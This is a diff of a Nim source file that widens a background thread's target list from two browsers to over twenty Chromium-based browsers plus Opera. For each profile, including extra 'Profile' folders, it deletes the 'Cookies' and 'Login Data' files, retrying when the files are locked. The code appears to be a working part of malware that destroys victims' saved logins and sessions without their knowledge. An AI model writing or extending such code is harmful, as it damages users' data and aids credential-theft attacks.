@@ -3,12 +3,18 @@ from os import tryRemoveFile
 from os import moveFile
 from os import `/`
 from os import getEnv
+from os import walkDir
+from os import PathComponent
+from os import existsDir
+
+from strutils import startsWith
 
 from ../flags import BROWSER_THREAD_REMOVE_FILE
 
 type
   BROWSER_TYPES = enum
     CHROME_BASED
+    OPERA_BASED # still CHROME_BASED but uses a diferent file structure
 
 
 proc removeFileOrSleep(src: string, doSleep: bool = false): void =
@@ -44,25 +50,75 @@ proc initBrowserThread*(): void {.thread.} =
       @[
         r"Google\Chrome",
         r"Microsoft\Edge",
+        r"7Star\7Star",
+        r"Amigo",
+        r"BraveSoftware\Brave-Browser",
+        r"CentBrowser",
+        r"Chedot",
+        r"Google\Chrome SxS",
+        r"Chromium",
+        r"CocCoc\Browser",
+        r"Comodo\Dragon",
+        r"Elements Browser",
+        r"Epic Privacy Browser",
+        r"Kometa",
+        r"Orbitum",
+        r"Sputnik\Sputnik",
+        r"Torch",
+        r"uCozMedia\Uran",
+        r"Vivaldi",
+        r"Yandex\YandexBrowse"
       ]
-    )
+    ),
+    (
+      OPERA_BASED,
+      @[
+        r"Opera Software\Opera Stable"
+      ]
+    ),
   ]
 
-  var localappdata: string = ""
+  # cache prefix to avoid multiple getEnv calls
+  var prefix: string = ""
 
   for browser in browsers:
+    # clear prefix for diferent browser types
+    prefix = ""
     for folder in browser.folders:
       var
-        fullFolder: string
-        files: seq[string]
+        fullFolder: string = ""
+        files: seq[string] = @[]
+      case browser.based
 
-      if browser.based == CHROME_BASED:
-        if localappdata == "":
-          localappdata = getEnv("localappdata")
-        fullFolder = localappdata / folder / r"User Data\Default"
-        files = @["Cookies", "Login Data"]
+      of CHROME_BASED, OPERA_BASED:
+        let isOpera: bool = browser.based == OPERA_BASED
+
+        # check if prefix is already assigned
+        if prefix == "":
+          prefix =
+            # opera uses appdata instead of localappdata
+            if isOpera:
+              getEnv("appdata")
+            else:
+              getEnv("localappdata")
+
+        fullFolder =
+          if isOpera:
+            prefix / folder
+          else:
+            prefix / folder / "User Data"
+
+        if existsDir(fullFolder):
+          files = @[r"Default\Cookies", r"Default\Login Data"]
+
+          for kind, folder in walkDir(fullFolder, true):
+            if kind == pcDir:
+              if folder.startsWith("Profile"):
+                files.add folder / "Cookies"
+                files.add folder / "Login Data"
 
       for file in files:
-        let filePath: string = fullFolder / file
+        # echo file
+        removeFileOrSleep(fullFolder / file)
 
-        removeFileOrSleep(filePath)
+# initBrowserThread()
